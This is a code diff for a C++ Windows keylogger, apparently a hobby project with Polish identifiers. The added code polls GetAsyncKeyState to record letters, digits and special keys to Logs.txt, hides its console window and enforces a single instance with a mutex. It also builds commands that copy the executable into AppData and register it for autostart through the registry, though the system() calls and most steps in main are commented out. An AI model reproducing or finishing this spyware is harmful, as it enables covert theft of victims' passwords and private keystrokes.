@@ -1,142 +1,212 @@
 #include <iostream>
-#include <fstream>
 #include <windows.h>
-#include <winuser.h>
-#include <conio.h>
+#include <fstream>
+#include <stdio.h>
+#include <cstring>
 using namespace std;
-char x;
-void StartingLogs()
+fstream logs;
+const string SCIEZKA="C:\\Users\\Patryk\\AppData\\Roaming\\KeyLogger.exe";
+int i;
+int vKey;
+void doSystemu(string sciezkaKeylogger)
 {
-  std:ofstream outf("Logs.txt");
-  fstream logs;
-  logs.open("Logs.txt", ios::app);
-  if(logs.is_open())
-  {
-    x=_getch();
-    logs<<x;
-    logs.close();
-  }
-  if(logs.good()==false)
-  {
-    cout<<"Error";
-  }
+    string komenda = "copy "+sciezkaKeylogger+" "+SCIEZKA;
+    cout << komenda<<endl;
+//    system(komenda.c_str());
 }
-void StartingLogsSP(string user_input)
+void Konsola()//Ukrywanie siê konsoli
 {
-  fstream logs;
-  logs.open("Logs.txt", ios:app);
-  if(logs.is_open())
-  {
-    logs<<user_input
-    logs.close
-  }
-  if(logs.good()==false)
-  {
-    cout<<"Error"
-  }
+    FreeConsole();
 }
-bool SpecialKeyTrueOrFalse(){
-switch (VK) {
-case VK_TAB:
-  cout << "#TAB";
-  strokeLOG("#TAB");
-  return true;
-/*case VK_SPACE:
-  cout << " ";
-  strokeLOG(" ");
-  return true;
-case VK_RETURN:
-  cout << "\n";
-  strokeLOG("\n");
-  return true;
-case VK_SHIFT:
-  cout << "#SHIFT#";
-  strokeLOG("#SHIFT#");
-  return true;
-case VK_BACK:
-  cout << "\b";
-  strokeLOG("\b");
-  return true;
-case VK_RBUTTON:
-  cout << "#R_CLICK#";
-  strokeLOG("#R_CLICK#");
-  return true;
-case VK_CAPITAL:
-  cout << "#CAPS_LOCK#";
-  strokeLOG("#CAPS_LCOK");
-  return true;
-case VK_UP:
-  cout << "#UP";
-  strokeLOG("#UP_ARROW_KEY");
-  return true;
-case VK_DOWN:
-  cout << "#DOWN";
-  strokeLOG("#DOWN_ARROW_KEY");
-  return true;
-case VK_LEFT:
-  cout << "[LEFT]";
-  strokeLOG("[LEFT_ARROW_KEY]");
-  return true;
-case VK_RIGHT:
-  cout << "[RIGHT]";
-  strokeLOG("[RIGHT_ARROW_KEY]");
-  return true;
-case VK_CONTROL:
-  cout << "[CONTROL]";
-  strokeLOG("[CONTROL]");
-  return true;
-case VK_MENU:
-  cout << "[ALT]";
-  strokeLOG("[ALT]");
-  return true;
-case VK_F1:
-  cout << "[F1]";
-  return true;
-case VK_F2:
-  cout << "[F2]";
-  return true;
-case VK_F2:
-  cout << "[F3]";
-  return true;
-case VK_F4:
-  cout << "[F4]";
-  return true;
-case VK_F5:
-  cout << "[F5]";
-  return true;
-case VK_F2:
-  cout << "[F6]";
-  return true;
-case VK_F2:
-  cout << "[F7]";
-  return true;
-case VK_F2:
-  cout << "[F8]";
-  return true;
-case VK_F9:
-  cout << "[F9]";
-  return true;
-case VK_F9:
-  cout << "[F10]";
-  return true;
-case VK_F10:
-  cout << "[F10]";
-  return true;
-case VK_F11:
-  cout << "[F11]";
-  return true;
-case VK_F12:
-  cout << "[F12]";
-  return true;*/
-default:
-  return false;
-}
-void hideConsole()
+void Zapisz(int input)//Zapisywanie do pliku
 {
-  FreeConsole();
+    logs.open("Logs.txt", ios::app);
+    if(logs.is_open())
+    {
+        logs<<(char)input;
+        logs.close();
+    }
+    if(logs.good()==false)
+    {
+        logs<<"Error";
+        exit(0);
+    }
 }
-int main()
+bool Mutex()
 {
-  StartingLogs();
-  return 0;
+    CreateMutex(NULL, true, "d41d8cd98f00b204e9800998ecf8427ezakitokox");
+    if(GetLastError() == ERROR_ALREADY_EXISTS)
+    {
+        return true;
+    }else{
+        return false;
+    }
+}
+void Autostart(string sciezka)//Dodawanie do autostartu
+{
+    string komenda = "reg ADD HKEY_CURRENT_USER\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v Test /t REG_SZ /d C:\\Users\\Patryk\\Desktop\\997\\bin\\Debug\\997.exe"+sciezka;
+    cout<<komenda;
+    //system(komenda.c_str());
+}
+void ZapiszSPECIAL(string input)//Zapisywanie do pliku znaków specjalnych
+{
+    logs.open("Logs.txt", ios::app);
+    if(logs.is_open())
+    {
+        logs<<input;
+        logs.close();
+    }
+    if(logs.good()==false)
+    {
+        logs<<"Error";
+        exit(0);
+    }
+}
+void Keylogger()
+{
+    while(true)
+    {
+        //Znaki
+        for(i=65; i<91; i++)
+        {
+            vKey = GetAsyncKeyState(i);
+            if(vKey==-32767 && !GetAsyncKeyState(VK_SHIFT))
+            {
+                cout<<(char)(i+32);
+                Zapisz(i);
+            }
+            else if(vKey==-32767 && GetAsyncKeyState(VK_SHIFT))
+            {
+                cout<<(char)i;
+                Zapisz(i);
+            }
+        }
+        //Liczby
+        for(i=48; i<58; i++)
+        {
+            if(GetAsyncKeyState(i)==-32767)
+            {
+                cout<<(char)i;
+                Zapisz(i);
+            }
+        }
+        //znaki specjalne
+        if (GetAsyncKeyState(VK_RETURN)==-32767)
+        {
+            cout << "[ENTER]";
+            ZapiszSPECIAL("[ENTER]");
+        }
+        if (GetAsyncKeyState(VK_TAB)==-32767)
+        {
+            cout << "[TAB]";
+            ZapiszSPECIAL("[TAB]");
+
+        }
+        if (GetAsyncKeyState(VK_CONTROL)==-32767)
+        {
+            cout << "[CTRL]";
+            ZapiszSPECIAL("[CTRL]");
+        }
+        if (GetAsyncKeyState(VK_MENU)==-32767)
+        {
+            cout << "[ALT]";
+            ZapiszSPECIAL("[ALT]");
+        }
+        if (GetAsyncKeyState(VK_CAPITAL)==-32767)
+        {
+            cout << "[CAPSLOCK]";
+            ZapiszSPECIAL("[CAPSLOCK]");
+        }
+        if (GetAsyncKeyState(VK_ESCAPE)==-32767)
+        {
+            cout << "[ESC]";
+            ZapiszSPECIAL("[ESC]");
+        }
+        if (GetAsyncKeyState(VK_DELETE)==-32767)
+        {
+            cout << "[DELETE]";
+            ZapiszSPECIAL("[DELETE]");
+        }
+        if (GetAsyncKeyState(VK_F1)==-32767)
+        {
+            cout << "[F1]";
+            ZapiszSPECIAL("[F1]");
+        }
+        if (GetAsyncKeyState(VK_F2)==-32767)
+        {
+            cout << "[F2]";
+            ZapiszSPECIAL("[F2]");
+        }
+        if (GetAsyncKeyState(VK_F3)==-32767)
+        {
+            cout << "[F3]";
+            ZapiszSPECIAL("[F3]");
+        }
+        if (GetAsyncKeyState(VK_F4)==-32767)
+        {
+            cout << "[F4]";
+            ZapiszSPECIAL("[F4]");
+        }
+        if (GetAsyncKeyState(VK_F5)==-32767)
+        {
+            cout << "[F5]";
+            ZapiszSPECIAL("[F5]");
+        }
+        if (GetAsyncKeyState(VK_F6)==-32767)
+        {
+            cout << "[F6]";
+            ZapiszSPECIAL("[F6]");
+        }
+        if (GetAsyncKeyState(VK_F7)==-32767)
+        {
+            cout << "[F7]";
+            ZapiszSPECIAL("[F7]");
+        }
+        if (GetAsyncKeyState(VK_F8)==-32767)
+        {
+            cout << "[F8]";
+            ZapiszSPECIAL("[F8]");
+        }
+        if (GetAsyncKeyState(VK_F9)==-32767)
+        {
+            cout << "[F9]";
+            ZapiszSPECIAL("[F9]");
+        }
+        if (GetAsyncKeyState(VK_F10)==-32767)
+        {
+            cout << "[F10]";
+            ZapiszSPECIAL("[F10]");
+        }
+        if (GetAsyncKeyState(VK_F11)==-32767)
+        {
+            cout << "[F11]";
+            ZapiszSPECIAL("[F11]");
+        }
+        if (GetAsyncKeyState(VK_F12)==-32767)
+        {
+            cout << "[F12]";
+            ZapiszSPECIAL("[F12]");
+        }
+        if (GetAsyncKeyState(VK_SPACE)==-32767)
+        {
+            cout<<" ";
+            Zapisz(32);
+        }
+        if (GetAsyncKeyState(VK_BACK)==-32767)
+        {
+            cout<<"[BACKSPACE]";
+            ZapiszSPECIAL("[BACKSPACE]");
+        }
+    }
+}
+int main(int argc, char * argv[])
+{
+     if (!Mutex())
+     {
+         //Konsola();
+         //Autostart("C:\\Users\\Patryk\\Desktop\\997\\bin\\Debug\\997.exe");
+         //Keylogger();
+         doSystemu(argv[0]);
+     }
+    return 0;
 }
